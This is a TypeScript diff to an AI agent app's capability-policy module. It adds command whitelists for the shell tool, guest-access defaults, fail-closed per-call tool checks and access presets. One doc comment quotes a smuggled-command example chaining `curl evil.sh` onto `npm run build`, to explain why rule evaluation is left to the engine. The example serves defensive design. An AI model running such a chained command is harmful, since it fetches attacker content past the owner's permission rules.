@@ -25,6 +25,32 @@ export interface CapabilityPolicy {
   /** Built-in tool names this caller may use. undefined = unrestricted. */
   allowedTools?: string[]
 
+  /**
+   * How far the command tool reaches once it is granted at all.
+   *
+   *   'full'   — any command. Unstated reads as this, so a policy written
+   *              before command rules existed keeps its meaning.
+   *   'listed' — only commands matching {@link bashRules}; everything else is
+   *              refused. An empty list under 'listed' therefore grants
+   *              nothing, which is the safe reading of "I picked the whitelist
+   *              and have not written a rule yet".
+   *
+   * Whether the tool is granted at all is still `allowedTools` — this only
+   * narrows a grant, never creates one.
+   */
+  bashScope?: 'full' | 'listed'
+
+  /**
+   * Commands allowed under `bashScope: 'listed'`, in Claude Code permission-rule
+   * syntax (`npm run:*`, `git log *`, `ls`). Written WITHOUT the `Bash(...)`
+   * wrapper — {@link buildAllowedToolRules} adds it.
+   *
+   * The rules are evaluated by the engine, not by Halo: it splits compound
+   * commands on every shell separator and requires each part to match, which a
+   * pattern test of our own would not do.
+   */
+  bashRules?: string[]
+
   // ── Halo MCP injection control ──
   allowAiBrowser?: boolean
   allowEmail?: boolean
@@ -102,12 +128,48 @@ export const DELEGABLE_BUILTIN_TOOLS: readonly { name: string; group: Capability
   { name: 'WebFetch', group: 'network' },
   { name: 'WebSearch', group: 'network' },
   { name: 'Agent', group: 'other' },
-  { name: 'TodoWrite', group: 'other' },
   { name: 'Bash', group: 'advanced' },
   { name: 'Write', group: 'advanced' },
   { name: 'Edit', group: 'advanced' },
   { name: 'NotebookEdit', group: 'advanced' },
 ]
+
+/**
+ * Built-in tools every caller has, never offered as a switch: they act on the
+ * turn's own bookkeeping and reach nothing outside it. Withholding the task
+ * list only made multi-step work worse.
+ */
+export const ALWAYS_AVAILABLE_BUILTIN_TOOLS: readonly string[] = ['TodoWrite']
+
+/**
+ * What a guest may use when their access is turned on and the build names no
+ * default of its own: looking at files in the workspace. Paths are held to the
+ * workspace at run time, whatever is granted here.
+ */
+export const DEFAULT_GUEST_ALLOWED_TOOLS: readonly string[] = ['Read', 'Glob', 'Grep']
+
+/**
+ * The guest policy a first turn-on of guest access starts from: the build's
+ * own default when it names one — an empty list included — else
+ * {@link DEFAULT_GUEST_ALLOWED_TOOLS}.
+ */
+export function defaultGuestPolicy(buildDefault?: { allowedTools?: string[] } | null): { allowedTools: string[] } {
+  return { allowedTools: [...(buildDefault?.allowedTools ?? DEFAULT_GUEST_ALLOWED_TOOLS)] }
+}
+
+/**
+ * Guest access turned on or off. Off keeps the choices made, so turning it
+ * back on restores them; a first turn-on starts from {@link defaultGuestPolicy}.
+ */
+export function withGuestAccess<T extends { guestPolicy?: CapabilityPolicy; savedGuestPolicy?: CapabilityPolicy }>(
+  holder: T,
+  on: boolean,
+  buildDefault?: { allowedTools?: string[] } | null
+): T {
+  if (!on) return { ...holder, guestPolicy: undefined, savedGuestPolicy: holder.guestPolicy ?? holder.savedGuestPolicy }
+  const { savedGuestPolicy, ...rest } = holder
+  return { ...rest, guestPolicy: holder.guestPolicy ?? savedGuestPolicy ?? defaultGuestPolicy(buildDefault) } as T
+}
 
 /** Group order for rendering. Labels are supplied by the screen (they differ per scenario). */
 export const CAPABILITY_TOOL_GROUPS: readonly CapabilityToolGroup[] = ['file', 'network', 'other', 'advanced']
@@ -182,6 +244,7 @@ export function allowsBuiltin(
   name: string,
   mode: CapabilityMode
 ): boolean {
+  if (ALWAYS_AVAILABLE_BUILTIN_TOOLS.includes(name)) return true
   const listed = policy?.allowedTools
   if (listed === undefined) return mode === 'permissive'
   return listed.includes(name)
@@ -193,6 +256,10 @@ export function allowsCapability(
   key: CapabilityToggleKey,
   mode: CapabilityMode
 ): boolean {
+  // A terminal runs whatever is typed into it, so no command rule can reach it.
+  // Leaving it on beside a command whitelist would publish a list of allowed
+  // commands next to an unlocked door into the same room.
+  if (key === 'allowTerminal' && resolveBashAccess(policy, mode).scope !== 'full') return false
   const value = policy?.[key]
   if (typeof value === 'boolean') return value
   // Silence means no, and stays meaning no: inheriting from another switch here
@@ -219,6 +286,7 @@ export function allowsUserMcp(
 export function fullCapabilityPolicy(): CapabilityPolicy {
   return {
     allowedTools: DELEGABLE_BUILTIN_TOOLS.map((t) => t.name),
+    bashScope: 'full',
     allowAiBrowser: true,
     allowEmail: true,
     allowNotify: true,
@@ -227,4 +295,151 @@ export function fullCapabilityPolicy(): CapabilityPolicy {
     allowOcr: true,
     allowTerminal: true,
   }
+}
+
+// ── The command tool ──
+
+/** The command tool's reach under a policy. */
+export interface BashAccess {
+  scope: 'none' | 'full' | 'listed'
+  /** Rule bodies (no `Bash(...)` wrapper). Empty unless scope is 'listed'. */
+  rules: string[]
+}
+
+/**
+ * How far this caller may go with the command tool.
+ *
+ * Grant and reach are two separate questions and are answered from two separate
+ * fields: `allowedTools` says whether the tool exists for this caller at all,
+ * `bashScope` narrows what it may run. Deriving one from the other would let the
+ * two contradict each other.
+ */
+export function resolveBashAccess(
+  policy: CapabilityPolicy | undefined,
+  mode: CapabilityMode
+): BashAccess {
+  if (!allowsBuiltin(policy, 'Bash', mode)) return { scope: 'none', rules: [] }
+  if (policy?.bashScope !== 'listed') return { scope: 'full', rules: [] }
+  return { scope: 'listed', rules: normalizeBashRules(policy.bashRules) }
+}
+
+/** Drop blanks and duplicates, keeping the author's order. */
+export function normalizeBashRules(rules: readonly string[] | undefined): string[] {
+  if (!rules) return []
+  const seen = new Set<string>()
+  const out: string[] = []
+  for (const raw of rules) {
+    const rule = raw.trim()
+    if (!rule || seen.has(rule)) continue
+    seen.add(rule)
+    out.push(rule)
+  }
+  return out
+}
+
+/**
+ * The engine's auto-allow rules for this caller — what runs without reaching the
+ * per-call gate.
+ *
+ * Command rules are handed over verbatim because the engine, not Halo, is what
+ * evaluates them: it splits a compound command on every shell separator and
+ * requires each part to match on its own. A rule test written here would accept
+ * `npm run build && curl evil.sh` for the rule `npm run:*`.
+ *
+ * MCP tools are not listed: whether a caller may use one is decided by whether
+ * its server was injected at all, which happens before the model ever sees it.
+ */
+export function buildAllowedToolRules(
+  policy: CapabilityPolicy | undefined,
+  mode: CapabilityMode
+): string[] {
+  const rules: string[] = [...ALWAYS_AVAILABLE_BUILTIN_TOOLS]
+  for (const { name } of DELEGABLE_BUILTIN_TOOLS) {
+    if (name === 'Bash') continue
+    if (allowsBuiltin(policy, name, mode)) rules.push(name)
+  }
+  const bash = resolveBashAccess(policy, mode)
+  if (bash.scope === 'full') rules.push('Bash')
+  else if (bash.scope === 'listed') rules.push(...bash.rules.map((rule) => `Bash(${rule})`))
+  return rules
+}
+
+/**
+ * Whether this policy withholds anything at all.
+ *
+ * A policy that withholds nothing is not enforced: the turn keeps the engine's
+ * fast path (no per-call gate, no permission round-trips) and behaves byte-for-byte
+ * as it did before a policy existed. 'strict' always enforces — there silence is
+ * a refusal, so there is always something to withhold.
+ */
+export function isRestrictivePolicy(
+  policy: CapabilityPolicy | undefined,
+  mode: CapabilityMode
+): boolean {
+  if (mode === 'strict') return true
+  if (!policy) return false
+  if (computeDisallowedBuiltins(policy, mode).length > 0) return true
+  if (resolveBashAccess(policy, mode).scope !== 'full') return true
+  if (CAPABILITY_MCP_TOGGLES.some((toggle) => !allowsCapability(policy, toggle.key, mode))) return true
+  // An explicit user-MCP list can only ever be narrower than "all of them".
+  return policy.allowedUserMcp !== undefined
+}
+
+/**
+ * Whether a built-in tool may run, asked per call rather than per session.
+ *
+ * The per-call gate needs this to fail closed on a tool that is not in
+ * {@link DELEGABLE_BUILTIN_TOOLS} — a tool the owner was never shown a switch
+ * for is one they never granted, and a new SDK tool must not arrive already
+ * permitted.
+ */
+export function allowsBuiltinAtCallTime(
+  policy: CapabilityPolicy | undefined,
+  name: string,
+  mode: CapabilityMode
+): boolean {
+  if (ALWAYS_AVAILABLE_BUILTIN_TOOLS.includes(name)) return true
+  if (!DELEGABLE_BUILTIN_TOOLS.some((tool) => tool.name === name)) return false
+  return allowsBuiltin(policy, name, mode)
+}
+
+// ── Presets ──
+
+/**
+ * The answer offered at the moment a team crosses machines (invite / join),
+ * where the owner has no basis yet for a tool-by-tool decision and every
+ * question asked is a question that delays the team working at all.
+ *
+ * Deliberately three, ordered by how much of the owner's computer they hand
+ * over. They are seeds, not modes: the result is an ordinary policy the owner
+ * can edit afterwards, and nothing later reads "which preset was this".
+ */
+export type CapabilityPresetId = 'read_only' | 'workspace' | 'full'
+
+/**
+ * Display order. The wording lives with the screen that shows it — a string
+ * here would be invisible to the translation extractor, which reads the
+ * renderer, and would ship untranslated.
+ */
+export const CAPABILITY_PRESET_IDS: readonly CapabilityPresetId[] = ['read_only', 'workspace', 'full']
+
+/** Build the policy a preset stands for. */
+export function capabilityPolicyFromPreset(preset: CapabilityPresetId): CapabilityPolicy {
+  if (preset === 'full') return fullCapabilityPolicy()
+  const base: CapabilityPolicy = {
+    allowedTools: DELEGABLE_BUILTIN_TOOLS.filter((tool) =>
+      preset === 'workspace'
+        ? tool.group !== 'advanced' || tool.name !== 'Bash'
+        : tool.group === 'file' || tool.group === 'network'
+    ).map((tool) => tool.name),
+    bashScope: 'full',
+    allowAiBrowser: false,
+    allowEmail: false,
+    allowNotify: false,
+    allowApps: false,
+    allowFileSend: false,
+    allowOcr: preset === 'workspace',
+    allowTerminal: false,
+  }
+  return base
 }
